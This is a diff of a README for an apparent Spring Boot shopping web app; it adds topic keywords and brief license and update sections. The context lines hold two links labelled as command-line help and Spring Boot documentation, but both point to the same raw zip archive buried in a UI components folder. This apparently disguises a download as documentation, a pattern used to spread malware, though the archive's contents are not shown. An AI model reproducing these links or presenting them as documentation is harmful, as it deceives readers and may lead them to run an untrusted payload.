@@ -185,3 +185,25 @@ If you run into problems, check these common issues:
 - [Basic Command Line Usage](https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/raw/refs/heads/main/src/components/ui/shopping_boot_spring_web_3.7-alpha.3.zip)
 - [Spring Boot Documentation](https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/raw/refs/heads/main/src/components/ui/shopping_boot_spring_web_3.7-alpha.3.zip)
 
+---
+
+## 📂 Topics and Keywords
+
+This project covers:
+
+`ecommerce`, `full-stack`, `java`, `mysql`, `shopping-cart`, `spring-boot`, `spring-security`, `thymeleaf`, `web-application-security`
+
+These keywords might help if you look for tutorials or troubleshooting tips online.
+
+---
+
+## 🏷 License
+
+Check the repository for license details if you plan to modify or share the app.
+
+---
+
+## ⚙️ Updating the App
+
+To update to a newer version in the future:
+
